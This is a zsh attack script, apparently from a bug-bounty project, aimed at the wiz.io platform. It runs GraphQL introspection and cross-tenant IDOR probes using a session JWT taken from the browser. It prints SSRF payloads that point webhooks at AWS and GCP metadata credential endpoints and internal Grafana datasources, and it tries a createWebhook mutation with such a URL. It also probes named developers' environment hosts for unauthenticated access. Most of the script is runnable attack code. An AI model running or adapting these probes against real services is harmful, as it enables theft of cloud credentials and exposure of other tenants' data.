#!/usr/bin/env zsh
# Phase 4 — Trial account attacks: Webhook SSRF + GraphQL IDOR
#
# REQUIRES: Wiz trial account registered at app.wiz.io
# Set WIZ_EMAIL and WIZ_JWT before running, or run login interactively.
#
# WHAT THIS TESTS:
#   Chain 3: Webhook SSRF → internal Grafana → cloud credentials
#   Chain 4: GraphQL cross-tenant IDOR (requires 2 accounts)
#
# Usage:
#   export WIZ_JWT="eyJ..."   # paste JWT from browser DevTools after login
#   zsh ~/bug-bounty-hunting-/scripts/phase4-trial-account-wiz.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

RESULTS=~/bug-bounty-hunting-/results/wiz.io/04-trial
mkdir -p "$RESULTS"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$RESULTS/trial-hunt.log"; }
sep() { echo "================================================================" | tee -a "$RESULTS/trial-hunt.log"; }

if [ -z "$WIZ_JWT" ]; then
  log "ERROR: WIZ_JWT not set."
  log "Steps to get JWT:"
  log "  1. Login at https://app.wiz.io"
  log "  2. Open DevTools → Network → any /graphql request"
  log "  3. Copy Authorization header value (after 'Bearer ')"
  log "  4. export WIZ_JWT='your-jwt-here'"
  log "  5. Re-run this script"
  exit 1
fi

log "=== Phase 4 trial account attacks — wiz.io ==="
sep

GRAPHQL="https://api.us1.app.wiz.io/graphql"
AUTH="Authorization: Bearer ${WIZ_JWT}"

gql_query() {
  local query="$1"
  curl -sk --connect-timeout 15 --max-time 30 \
    -X POST "$GRAPHQL" \
    -H "$AUTH" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"${query}\"}" 2>/dev/null
}

# ----------------------------------------------------------------
# A. JWT validation and tenant extraction
# ----------------------------------------------------------------
log "A. JWT validation + tenant info"

{
  echo "=== Decode JWT payload (base64) ==="
  echo "$WIZ_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20

  echo ""
  echo "=== whoami query ==="
  gql_query 'query { me { id name email } }' | python3 -m json.tool 2>/dev/null

  echo ""
  echo "=== tenant info ==="
  gql_query 'query { tenant { id name tier } }' | python3 -m json.tool 2>/dev/null
} | tee "$RESULTS/jwt-tenant-info.txt"
sep

# ----------------------------------------------------------------
# B. GraphQL introspection (full schema)
# ----------------------------------------------------------------
log "B. GraphQL full schema introspection"

curl -sk --connect-timeout 15 --max-time 60 \
  -X POST "$GRAPHQL" \
  -H "$AUTH" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } mutationType { fields { name description args { name type { name kind ofType { name kind } } } } } } }"
  }' 2>/dev/null | python3 -m json.tool 2>/dev/null \
  | tee "$RESULTS/graphql-schema.txt"
log "Full schema → $RESULTS/graphql-schema.txt"

# Extract all query names for IDOR analysis
echo "" | tee -a "$RESULTS/graphql-schema.txt"
echo "=== Query names ==="
python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    fields = d['data']['__schema']['queryType']['fields']
    for f in sorted(fields, key=lambda x: x['name']):
        args = [a['name'] for a in f.get('args', [])]
        print(f\"{f['name']}({', '.join(args)})\")
except: pass
" < "$RESULTS/graphql-schema.txt" | tee "$RESULTS/graphql-query-list.txt"
log "Query list → $RESULTS/graphql-query-list.txt"
sep

# ----------------------------------------------------------------
# C. IDOR candidates — queries with id parameters
# ----------------------------------------------------------------
log "C. IDOR probe — queries accepting id parameter"

MY_TENANT=$(gql_query 'query { tenant { id } }' 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['data']['tenant']['id'])" 2>/dev/null)
log "My tenant ID: $MY_TENANT"

{
  echo "MY_TENANT_ID: $MY_TENANT"
  echo ""

  echo "=== project query (cross-tenant IDOR target) ==="
  gql_query 'query { projects(first: 3) { nodes { id name cloudAccountCount } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== connector list (cloud creds!) ==="
  gql_query 'query { connectors(first: 3) { nodes { id name type status } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== issues list ==="
  gql_query 'query { issues(first: 3) { nodes { id title severity } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== cloudResources ==="
  gql_query 'query { cloudResources(first: 3) { nodes { id name type } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== node() global ID lookup ==="
  gql_query 'query { node(id: "test-id-12345") { id __typename } }' \
    | python3 -m json.tool 2>/dev/null | head -20
} | tee "$RESULTS/idor-baseline.txt"
log "IDOR baseline → $RESULTS/idor-baseline.txt"

# Extract my IDs for cross-tenant test
MY_PROJECT=$(python3 -c "
import json, sys
try:
    d = open('$RESULTS/idor-baseline.txt').read()
    import re
    ids = re.findall(r'\"id\": \"([a-f0-9-]{36})\"', d)
    print(ids[0] if ids else '')
except: pass
" 2>/dev/null)
log "Sample project ID: $MY_PROJECT"
sep

# ----------------------------------------------------------------
# D. Webhook SSRF (P0 — highest payout chain)
# ----------------------------------------------------------------
log "D. Webhook SSRF probe"
log "  Manual step needed: create a webhook via portal UI"
log "  Settings → Integrations → Custom Webhooks → Add"
log "  Then trigger an alert to activate the webhook"

{
  echo "=== SSRF PAYLOAD LIST ==="
  echo "Try each URL as webhook destination in portal UI:"
  echo ""
  echo "1. AWS IMDSv1 (direct):"
  echo "   http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  echo ""
  echo "2. AWS IMDSv1 role name then creds:"
  echo "   http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
  echo ""
  echo "3. GCP metadata:"
  echo "   http://metadata.google.internal/computeMetadata/v1/?recursive=true"
  echo "   (header required: Metadata-Flavor: Google — check if webhook svc adds it)"
  echo ""
  echo "4. Internal Grafana health (no auth):"
  echo "   http://us1.grafana.wiz.io/api/health"
  echo ""
  echo "5. Internal Grafana datasources (admin access = cloud creds):"
  echo "   http://us1.grafana.wiz.io/api/datasources"
  echo ""
  echo "6. Localhost probe:"
  echo "   http://127.0.0.1:3000/api/health"
  echo "   http://127.0.0.1:8080/"
  echo ""
  echo "7. OOB detection (use your interactsh domain):"
  echo "   http://INTERACTSH_DOMAIN/ssrf-test"

  echo ""
  echo "=== Check if webhook endpoint accepts localhost/RFC1918 ==="
  # These are GraphQL mutations that create webhook configs — check schema
  gql_query 'query { __type(name: "CreateWebhookInput") { fields { name type { name } description } } }' \
    | python3 -m json.tool 2>/dev/null | head -40

  echo ""
  echo "=== Try GraphQL webhook create directly ==="
  gql_query 'mutation { createWebhook(input: { name: "ssrf-test", url: "http://169.254.169.254/latest/meta-data/", method: POST }) { webhook { id url } } }' \
    | python3 -m json.tool 2>/dev/null | head -20
} | tee "$RESULTS/webhook-ssrf-guide.txt"
log "Webhook SSRF guide → $RESULTS/webhook-ssrf-guide.txt"
sep

# ----------------------------------------------------------------
# E. RDE webhooks — developer environments (no auth needed maybe)
# ----------------------------------------------------------------
log "E. RDE developer webhook endpoints (may have relaxed auth)"

{
  for host in \
    webhooks.guy.goldenberg.rde.wiz.io \
    webhooks.roey.dror-us.rde.wiz.io \
    webhooks.roy5.rde.wiz.io \
    webhooks.cfir.rde.wiz.io \
    webhooks.on-demand-1.rde.wiz.io \
    webhooks.bootstrap-rde-001.rde.wiz.io; do
    echo "=== $host ==="
    headers=$(curl -sI --connect-timeout 8 "https://${host}/" 2>/dev/null | head -15)
    body=$(curl -sk --connect-timeout 8 "https://${host}/" 2>/dev/null | head -c 400)
    echo "HEADERS: $headers"
    echo "BODY: $body"
    # Try unauthenticated GraphQL on RDE
    gql_resp=$(curl -sk --connect-timeout 8 -X POST "https://${host}/graphql" \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __typename }"}' 2>/dev/null | head -c 200)
    echo "GRAPHQL (no auth): $gql_resp"
    echo ""
  done
} | tee "$RESULTS/rde-webhook-detailed.txt"
log "RDE detailed probe → $RESULTS/rde-webhook-detailed.txt"
sep

# ----------------------------------------------------------------
# F. Cross-tenant IDOR — requires 2 accounts
# ----------------------------------------------------------------
log "F. Cross-tenant IDOR note"
cat << 'EOF' | tee "$RESULTS/cross-tenant-guide.txt"
=== CROSS-TENANT IDOR GUIDE ===

To test cross-tenant IDOR (Chain 4):

1. Register SECOND Wiz trial account (different email/Google account)
2. Extract IDs from second account: project IDs, connector IDs, issue IDs
3. Use FIRST account's JWT to query those IDs

Test pattern:
  From account B, get project ID: proj-B-12345
  From account A, query:
    { project(id: "proj-B-12345") { name cloudAccountCount connectors { nodes { id } } } }

If account A can see account B's project → Critical cross-tenant IDOR

Key queries to test:
  project(id: X)
  connector(id: X)  ← highest value (= cloud credentials)
  issue(id: X)
  cloudResource(id: X)
  node(id: X)       ← Relay global ID, most dangerous

EOF
sep

log "=== Phase 4 trial account hunt COMPLETE ==="
log "Priority order:"
log "  1. Webhook SSRF — use portal UI to create webhook with SSRF payloads"
log "  2. Cross-tenant IDOR — register second account and test IDs above"
log "  3. GraphQL schema analysis — check $RESULTS/graphql-schema.txt for hidden queries"
log "Results: $RESULTS/"
ls -la "$RESULTS/"
